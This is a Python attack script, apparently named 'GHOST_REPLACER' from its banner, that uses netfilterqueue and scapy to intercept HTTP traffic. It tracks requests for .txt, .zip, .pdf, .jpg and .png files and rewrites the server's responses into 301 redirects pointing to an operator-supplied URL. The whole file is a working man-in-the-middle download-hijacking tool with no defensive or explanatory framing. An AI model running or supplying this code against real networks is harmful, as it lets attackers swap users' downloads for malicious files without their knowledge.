import netfilterqueue
import scapy.all as scapy

seq_num=[]
title='''                                                                                                             
    ..+=.   ..   ..    .+#:.    :**.  .......          .....   ......  .....   .        ..     .-*:.  ......  .....      
   -%@@@@*  #@   %@: .*@@@@%-  *@@@@* @@@@@@%+        =@@@@@+  @@@@@* =@@@@@: -@:      =@@.   =@@@@@::@@@@@* :@@@@@=     
   @@=..%=  #@   %@: =@@:.+@@ -@#..+- ..*@-..         =@=.-@@  @#...  =@#.*@* -@:      %@@+  =@@=.-# :@@...  :@-.-@@.    
  +@*       #@:::%@: %@:   *@+-@@=:.    *@:           =@- .#@  @#-::  =@# :@# -@:     .@+@*  +@+     :@@:::  :@-  #@.    
  %@= .***- #@@@@@@:.@@    +@# +@@@#:   *@:           =@#*#@%  @@@@@: =@@*%@+ -@:     #@:%@: #@      :@@@@@. :@#*#@%     
  #@= :@@@= #@%%%@@:.@@    +@*   +@@@   *@:           =@@@@#   @#---  =@@@@%  -@:     @# .@= *@:     :@@---  :@@@@%      
  :@@= .+@- #@   %@: *@#:.=@@.:%:  @@   *@:           =@  @@   @#     =@#     -@-... +@@@@@@ =@@: :- :@@     :@- @@.     
   =@@#%@#. #@   %@: .%@@%@@- +@@##@*   *@: ========= =@  =@#  @@###* =@#     -@%%%%:#@:::+@-.%@@#%@::@@###+ :@- +@#     
                                                                                                                     
'''
print(title)
rep_cont=input("Enter your new url where you want to redirect : ")
print("\nListening.........\n")
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    
    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
        if scapy_packet[scapy.TCP].dport == 80:            
            ld = str(scapy_packet[scapy.Raw].load)
            if ".txt" in ld or ".zip" in ld or ".pdf" in ld or ".jpg" in ld or ".png" in ld:
                seq_num.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in seq_num:
                print("\n=== MATCH FOUND REPLACING THE FILE ===\n")
                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: "+rep_cont+"\n\n"
                seq_num.remove(scapy_packet[scapy.TCP].seq)
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.TCP].chksum
                packet.set_payload(bytes(scapy_packet))
        

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
